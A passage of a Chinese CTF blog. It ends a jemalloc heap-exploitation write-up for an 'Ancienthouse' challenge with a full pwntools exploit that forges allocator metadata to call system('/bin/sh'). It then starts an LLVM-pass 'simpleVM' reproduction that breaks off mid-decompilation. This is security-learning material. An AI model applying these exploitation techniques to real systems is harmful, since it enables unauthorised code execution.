<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (<span class="keyword">arena_run_t</span>)*<span class="number">0x7fc184808000</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  magic = <span class="number">944430995</span>,</span><br><span class="line">  bin = <span class="number">0x7fc185000d70</span>,</span><br><span class="line">  nextind = <span class="number">1</span>,</span><br><span class="line">  nfree = <span class="number">49</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>把 nfree 改为50，其他条目都不变</li>
<li>如果 nfree 为初始值，jemalloc 就会认为该 run 没有进行分配，下一次分配就会覆盖 p_fun（这里不是很清楚原因，可能要在源码中找依据）</li>
</ul>
<p>堆溢出 <code>merge</code> 有3个条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index1 == index2 || size1 != size2 || size1 + size2 &gt; <span class="number">0x5F</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Dont try anything funny &quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>index 不相同，size 相同，size1 + size2 &gt; 0x5F</li>
<li>好像就只能使用两个 0x20 进行 <code>merge</code> 了</li>
</ul>
<p>还有一个关键点：malloc 分配的数据是连续的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">merge_name</span><span class="params">(<span class="keyword">char</span> *name1, <span class="keyword">char</span> *name2, <span class="keyword">unsigned</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> len; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>(name1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; size; ++i )</span><br><span class="line">    name1[i + len] = name2[i];</span><br><span class="line">  name1[i + len] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> name1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>“size”为“0x60”（size1+size2+size2）</li>
<li>name2 的后半部分必须是 fake arena_run_t[0x50]</li>
</ul>
<p><strong>堆风水的构建</strong></p>
<p>首先，name 必须连续，用两个连续的 name 来充当 name2，这里我参考了学长的思路：</p>
<ul>
<li>正常释放时，内存排列为：chunkF-nameF-chunkF-nameF-chunkF-nameF </li>
<li>使用 malloc(0x60) 打乱内存的排列：chunk-nameF-chunkF-nameF-chunkF-nameF </li>
<li>然后继续 malloc(0x20) 两次：chunk-chunk-name-chunk-name-nameF </li>
<li>原本 name 的位置被写入了 chunk，原本 chunk 的位置被写入了 name，最后的 name-nameF 满足了 name 连续的条件</li>
<li>所以，可以在最后一个 nameF 中装入 fake arena_run_t[0x50]</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./Ancienthouse&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./Ancienthouse&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter the size : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter name : &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">battle</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter enemy id : &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">id1,id2</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;[+] Enemy id 1: &quot;</span>,<span class="built_in">str</span>(id1))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;[+] Enemy id 2: &quot;</span>,<span class="built_in">str</span>(id2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">		battle(<span class="built_in">id</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;yhellow&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">battle(-<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Starting battle with &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot; ....&quot;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr-<span class="number">0x4008</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line">success(<span class="string">&quot;chunk_list &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base+<span class="number">0x4040</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;You beat &#x27;em!\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 0 </span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">kill(<span class="number">0</span>)</span><br><span class="line">kill(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">battle(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Starting battle with &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot; ....&quot;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xb00a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	battle(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;You beat &#x27;em!\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">61</span>):</span><br><span class="line">	add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 3-63</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 64</span></span><br><span class="line">binsh = heap_base + <span class="number">0xa800</span> </span><br><span class="line">payload = p64(<span class="number">0x384adf93</span>)+p64(heap_base+<span class="number">0x800d70</span>)+p64(<span class="number">0x0000003200000001</span>)+p64(<span class="number">0x0003ffffffffffff</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 65 </span></span><br><span class="line">add(<span class="number">0x20</span>, payload) <span class="comment"># 66 </span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;3&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 67</span></span><br><span class="line">kill(<span class="number">65</span>)</span><br><span class="line">kill(<span class="number">66</span>)</span><br><span class="line"><span class="comment"># chunkF-nameF-chunkF-nameF(t)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;k&#x27;</span> * <span class="number">0x60</span>) <span class="comment"># 68</span></span><br><span class="line"><span class="comment"># (chunk)-nameF-chunkF-nameF(t)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>) <span class="comment"># 69 </span></span><br><span class="line"><span class="comment"># chunk-(chunk-name)-nameF(t)</span></span><br><span class="line"></span><br><span class="line">merge(<span class="number">67</span>, <span class="number">69</span>)</span><br><span class="line"></span><br><span class="line">system = pro_base + <span class="number">0x1170</span></span><br><span class="line">paylaod = p64(system) + p64(binsh)</span><br><span class="line">add(<span class="number">0x50</span>, paylaod) <span class="comment"># p_func</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>jemalloc 对于 small part 的分配已经比较清楚了，但有些细节没有对照源码来看，只是记了结论</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">LLVM+Got劫持</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-04 23:09:54" itemprop="dateCreated datePublished" datetime="2022-06-04T23:09:54+08:00">2022-06-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-13 17:53:12" itemprop="dateModified" datetime="2022-11-13T17:53:12+08:00">2022-11-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>红帽杯 simpleVM 复现</strong></p>
<p>注意：做 LLVM pass 的 pwn 题最好使用 IDA7.7 及其以上的版本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hack LLVM!</span><br><span class="line"></span><br><span class="line">Docker Guidance:</span><br><span class="line"></span><br><span class="line">FROM ubuntu:<span class="number">18.04</span></span><br><span class="line">  </span><br><span class="line">RUN sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.<span class="built_in">list</span> &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd libseccomp-dev libseccomp2 seccomp clang<span class="number">-8</span> opt llvm<span class="number">-8</span> python</span><br><span class="line"></span><br><span class="line">once your <span class="built_in">exp</span>.bc(bitcode file) is uploaded</span><br><span class="line"></span><br><span class="line">Sever will execute `opt<span class="number">-8</span> -load ./VMPass.so -VMPass ./<span class="built_in">exp</span>.bc`</span><br></pre></td></tr></table></figure>
<p>按照程序要求，预先配置好环境</p>
<p>知晓“在代码中注册的名字”时，就可以通过如下方法寻找 runOnFunction：</p>
<ul>
<li>在 IDA 中搜索题目给定的“在代码中注册的名字”，找到对应的函数</li>
</ul>
<p><img src="/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917067225.png" alt="1653917067225"> </p>
<ul>
<li>在这个函数及其子函数中寻找 off-xxxx 就可能找到虚表（尽量找那些未命名的函数）</li>
</ul>
<p><img src="/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917316159.png" alt="1653917316159"> </p>
<ul>
<li>虚表的最后一个条目就是 runOnFunction</li>
</ul>
<p><img src="/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917365912.png" alt="1653917365912"> </p>
<p>如果函数名是 <code>o0o0o0o0</code>，则调用函数 <code>sub_6AC0</code> 进行进一步处理：（本人看不懂Cpp）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::BasicBlock *BasicBlock; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    BasicBlock = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>*(v5);</span><br><span class="line">    <span class="built_in">sub_6B80</span>(a1, BasicBlock);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>大概的意思就是：遍历IR中 <code>o0o0o0o0</code> 函数中的 <code>BasicBlock(基本代码块)</code>，然后继续调用 <code>sub_6B80</code> 函数进行处理</li>
<li>该函数会遍历 <code>BasicBlock(基本代码块)</code> 中的指令，然后匹配到对应指令后进行处理</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *BasicBlock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *key_min2; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 ArgOp_min2; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  __int64 op_min; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *key_min; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *reg_min; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 ArgOp_min; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *key_add2; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 ArgOp_add2; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 op_add; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *key_add; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *reg_add; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 ArgOp_add; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 op_load; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *key_load; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">void</span> *reg_load; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 ArgOp_load; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 op_store; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *key_store; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="keyword">void</span> *reg_store; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 ArgOp_store; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 op_push; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *key_push; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *reg_push; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 ArgOp_push; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 op_pop; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *key_pop; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *reg_pop; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOp_pop; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> *name; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::begin(BasicBlock);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::end(BasicBlock);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction 